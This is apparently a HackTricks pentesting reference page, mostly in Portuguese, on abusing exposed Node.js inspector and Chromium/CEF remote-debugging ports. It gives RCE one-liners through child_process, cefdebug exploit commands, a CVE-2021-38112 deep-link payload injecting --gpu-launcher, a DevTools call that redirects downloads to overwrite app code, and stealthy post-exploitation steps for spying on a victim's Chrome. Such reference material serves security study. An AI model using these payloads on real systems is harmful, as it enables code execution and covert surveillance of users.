# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Quando iniciado com a opção `--inspect`, um processo Node.js escuta por um cliente de debugging. Por **padrão**, ele escutará no host e na porta **`127.0.0.1:9229`**. Cada processo também recebe um **UUID** **exclusivo**.

Os clientes do Inspector precisam conhecer e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa será semelhante a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Como o **debugger tem acesso total ao ambiente de execução do Node.js**, um agente malicioso capaz de se conectar a essa porta pode conseguir executar código arbitrário em nome do processo Node.js (**possível elevação de privilégios**).

Há várias maneiras de iniciar um Inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando você inicia um processo inspecionado, algo semelhante a isto aparecerá:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processos baseados em **CEF** (**Chromium Embedded Framework**) precisam usar o parâmetro: `--remote-debugging-port=9222` para abrir o **debugger** (as proteções contra **SSRF** permanecem muito semelhantes). No entanto, em vez de conceder uma sessão de **debug** do **NodeJS**, eles se comunicam com o navegador usando o [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), que é uma interface para controlar o navegador, mas não há um **RCE** direto.

Ao iniciar um navegador em modo de debug, algo semelhante a isto será exibido:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites abertas em um web-browser podem fazer requisições WebSocket e HTTP sob o modelo de segurança do browser. Uma **conexão HTTP inicial** é necessária para **obter um identificador exclusivo de sessão do debugger**. A **same-origin-policy** **impede** que websites possam fazer **essa conexão HTTP**. Para segurança adicional contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** o Node.js verifica se os **'Host' headers** da conexão especificam precisamente um **endereço IP**, **`localhost`** ou **`localhost6`**.

> [!TIP]
> Essas **medidas de segurança impedem explorar o inspector** para executar código **apenas enviando uma requisição HTTP** (o que poderia ser feito explorando uma vulnerabilidade SSRF).

### Iniciando o inspector em processos em execução

Você pode enviar o **signal SIGUSR1** para um processo nodejs em execução para fazê-lo **iniciar o inspector** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes; portanto, isso pode conceder **acesso privilegiado às informações dentro do processo**, mas não uma escalada direta de privilégios.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Isso é útil em containers porque **encerrar o processo e iniciar um novo** com `--inspect` **não é uma opção**, pois o **container** será **encerrado** junto com o processo.

### Conectar ao inspector/debugger

Para conectar-se a um **browser baseado em Chromium**, as URLs `chrome://inspect` ou `edge://inspect` podem ser acessadas no Chrome ou Edge, respectivamente. Ao clicar no botão Configure, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Remote Code Execution (RCE):

![Após uma URL para acessar o debugger aparecerá. ex.: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectar ao inspector/debugger: Para conectar-se a um browser baseado em Chromium,...](<../../images/image (674).png>)

Usando a **linha de comando**, você pode conectar-se a um debugger/inspector com:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspetores** em execução localmente e **injetar código** neles.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Observe que exploits de **RCE** em **NodeJS** não funcionarão se conectados a um navegador por meio do [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (é necessário verificar a API para encontrar coisas interessantes para fazer com ele).

## RCE no Debugger/Inspector do NodeJS

> [!TIP]
> Se você veio aqui procurando saber como obter [**RCE a partir de um XSS no Electron, consulte esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algumas formas comuns de obter **RCE** quando é possível **conectar-se** a um **inspector** do Node são usar algo como (parece que isso **não funcionará em uma conexão com o Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads do Chrome DevTools Protocol

Você pode consultar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Nesta seção, vou apenas listar coisas interessantes que descobri que foram usadas para explorar esse protocolo.

### Injeção de parâmetros via Deep Links

No [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), a Rhino Security descobriu que um aplicativo baseado em CEF **registrou uma UR**I personalizada no sistema (workspaces://index.html), que recebia a URI completa e então **iniciava o aplicativ**o baseado em CEF com uma configuração parcialmente construída a partir dessa URI.

Foi descoberto que os parâmetros da URI eram decodificados como URL e usados para iniciar o aplicativo básico baseado em CEF, permitindo que um usuário **injetasse** a flag **`--gpu-launcher`** na **linha de comando** e executasse comandos arbitrários.

Assim, um payload como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Executará um calc.exe.

### Substituir arquivos

Altere a pasta onde os **arquivos baixados serão salvos** e baixe um arquivo para **sobrescrever** frequentemente o **código-fonte** usado do aplicativo com o seu **código malicioso**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

According to this post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) é possível obter RCE e fazer exfiltration de páginas internas do theriver.

### Post-Exploitation

Em um ambiente real e **após comprometer** um PC de usuário que utiliza um navegador baseado em Chrome/Chromium, você poderia iniciar um processo do Chrome com o **debugging ativado e fazer port-forward da porta de debugging** para poder acessá-lo. Dessa forma, você poderá **inspecionar tudo o que a vítima faz com o Chrome e roubar informações sensíveis**.

A maneira stealth é **encerrar todos os processos do Chrome** e então executar algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referências

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
